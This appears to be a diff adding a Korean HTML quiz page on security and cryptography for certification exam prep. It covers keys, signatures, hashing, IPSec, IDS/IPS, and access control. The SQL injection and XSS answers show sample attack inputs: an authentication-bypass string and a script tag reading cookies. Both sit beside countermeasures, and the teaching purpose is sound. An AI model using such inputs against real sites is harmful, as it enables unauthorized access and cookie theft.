+          <strong>비대칭키</strong>: 공개키 암호화 → 개인키 복호화 / RSA·ECC / 느림 / 키 배송 문제 없음<br><br>
+          실제로는 <strong>하이브리드</strong> 방식 사용: 비대칭키로 대칭 세션키 교환 → 대칭키로 데이터 암호화
+        </div>
+      </div>
+    </div>
+
+    <!-- Q2 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge year">기출 빈출</span>&nbsp;
+          전자서명(Digital Signature)에서 서명 생성 시 어떤 키를 사용하고, 검증 시 어떤 키를 사용하는지 쓰시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">서명: 송신자의 개인키 / 검증: 송신자의 공개키</div>
+        <div class="ans-explain">
+          전자서명 과정:<br>
+          ① 원문 → 해시값 생성<br>
+          ② 해시값을 <strong>개인키</strong>로 암호화 = 서명<br>
+          ③ 수신측: 서명을 <strong>공개키</strong>로 복호화 → 해시값 획득<br>
+          ④ 원문 다시 해시 → 두 해시값 비교 → 일치 시 무결성·인증 확인<br><br>
+          전자서명 효과: ① 무결성 ② 인증 ③ 부인 방지
+        </div>
+      </div>
+    </div>
+
+    <!-- Q3 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge year">기출 빈출</span>&nbsp;
+          SQL Injection 공격의 원리와 가장 효과적인 대응 방법을 쓰시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">원리: 입력값에 SQL 코드 삽입 → 쿼리 조작<br>대응: Prepared Statement (파라미터화 쿼리)</div>
+        <div class="ans-explain">
+          <strong>공격 예시</strong>: 아이디에 <code>' OR '1'='1</code> 입력 → WHERE 조건 항상 참이 되어 인증 우회<br><br>
+          <strong>대응 방법</strong> (순서대로):<br>
+          ① <strong>Prepared Statement</strong>: 입력값을 SQL과 분리하여 실행 (가장 효과적)<br>
+          ② 입력값 검증·이스케이핑<br>
+          ③ 최소 권한 DB 계정 사용<br>
+          ④ 에러 메시지에 DB 정보 노출 금지
+        </div>
+      </div>
+    </div>
+
+    <!-- Q4 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge year">기출 빈출</span>&nbsp;
+          XSS(Cross-Site Scripting) 공격 원리와 방어 방법을 쓰시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">원리: 악성 스크립트를 웹 페이지에 삽입 → 다른 사용자 브라우저에서 실행<br>대응: 출력 시 HTML 특수문자 인코딩</div>
+        <div class="ans-explain">
+          <strong>공격 시나리오</strong>: 게시판에 &lt;script&gt;document.cookie&lt;/script&gt; 삽입 → 피해자 쿠키 탈취<br><br>
+          <strong>대응 방법</strong>:<br>
+          ① 출력 인코딩: <code>&lt;</code>→<code>&amp;lt;</code>, <code>&gt;</code>→<code>&amp;gt;</code> 변환<br>
+          ② CSP(Content Security Policy) 헤더 설정<br>
+          ③ HttpOnly 쿠키 (JS에서 쿠키 접근 불가)<br>
+          ④ 입력값 검증 (화이트리스트 기반)
+        </div>
+      </div>
+    </div>
+
+    <!-- Q5 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge year">기출 빈출</span>&nbsp;
+          접근 제어 모델 DAC, MAC, RBAC을 각각 간략히 설명하시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">DAC: 소유자가 접근 권한 결정<br>MAC: 시스템·보안 정책이 접근 제어<br>RBAC: 역할(Role) 기반으로 권한 부여</div>
+        <div class="ans-explain">
+          <strong>DAC</strong> (임의적): 데이터 소유자가 권한 설정 → 유연, 보안 약함. 예: 유닉스 chmod<br>
+          <strong>MAC</strong> (강제적): 보안 등급(기밀/비밀/일반) 기반, 시스템이 통제 → 군사 환경<br>
+          <strong>RBAC</strong> (역할기반): 관리자/직원/게스트 역할에 권한 묶음 → 기업 환경 표준<br><br>
+          보안 강도: DAC &lt; RBAC &lt; MAC
+        </div>
+      </div>
+    </div>
+
+    <!-- Q6 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge sim">기출 유사</span>&nbsp;
+          해시 함수(Hash Function)의 특성 3가지를 쓰시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">① 역상 저항성 ② 제2 역상 저항성 ③ 충돌 저항성</div>
+        <div class="ans-explain">
+          ① <strong>역상 저항성</strong>: 해시값으로부터 원문 역추적 불가 (단방향성)<br>
+          ② <strong>제2 역상 저항성</strong>: 같은 해시값을 가진 다른 원문을 찾는 것이 불가<br>
+          ③ <strong>충돌 저항성</strong>: 해시값이 같은 서로 다른 두 원문을 찾는 것이 불가<br><br>
+          추가 특성: 눈사태 효과 (입력 1비트 변경 → 출력 전체 변화), 고정 출력 길이<br>
+          MD5·SHA-1은 충돌 취약 발견 → SHA-256 이상 권장
+        </div>
+      </div>
+    </div>
+
+    <!-- Q7 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge sim">기출 유사</span>&nbsp;
+          IPSec의 두 가지 동작 모드(전송 모드, 터널 모드)의 차이를 쓰시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">전송 모드: IP 페이로드만 보호, 헤더 그대로<br>터널 모드: 원본 패킷 전체 암호화 + 새 IP 헤더 추가</div>
+        <div class="ans-explain">
+          <strong>전송 모드</strong>: 호스트-호스트 간 직접 통신. IP 헤더는 암호화 안 됨.<br>
+          <strong>터널 모드</strong>: 게이트웨이-게이트웨이 간. 원본 IP까지 숨김. <strong>VPN 구현에 사용됨 (더 많이 쓰임)</strong><br><br>
+          IPSec 프로토콜:<br>
+          • <strong>AH</strong>: 인증+무결성 (암호화 없음)<br>
+          • <strong>ESP</strong>: 인증+무결성+<strong>기밀성</strong> (암호화 포함, 더 많이 사용)
+        </div>
+      </div>
+    </div>
+
+    <!-- Q8 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge sim">개념 확인</span>&nbsp;
+          IDS와 IPS의 차이점을 설명하고, IDS의 두 가지 탐지 방식을 비교하시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">IDS: 탐지·알림만 (수동적)<br>IPS: 탐지 + 자동 차단 (능동적)</div>
+        <div class="ans-explain">
+          <strong>IDS vs IPS</strong>:<br>
+          IDS = 침입탐지시스템 → 이상 감지 후 알림만 발송 (미러 포트 위치)<br>
+          IPS = 침입방지시스템 → 이상 감지 후 즉시 트래픽 차단 (인라인 위치)<br><br>
+          <strong>IDS 탐지 방식</strong>:<br>
+          ① <strong>오용(서명) 탐지</strong>: 알려진 공격 패턴 DB와 비교 → 오탐 낮음, 신종 공격 못 잡음<br>
+          ② <strong>이상 탐지</strong>: 정상 행동 기준선과 비교 → 신종 공격 탐지 가능, 오탐 높음
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /quiz-wrap -->
+</div><!-- /container -->
+
+<footer style="text-align:center; padding:1.5rem; color:var(--gray); font-size:0.78rem; border-top:1px solid var(--border);">
+  Level-2 · 10 보안 & 암호화 · <a href="index.html" style="color:var(--accent); text-decoration:none;">← 목록으로</a>
+</footer>
+
+<script>
+function toggle(el) {
+  el.closest('.quiz-card').classList.toggle('open');
+}
+</script>
+</body>
+</html>
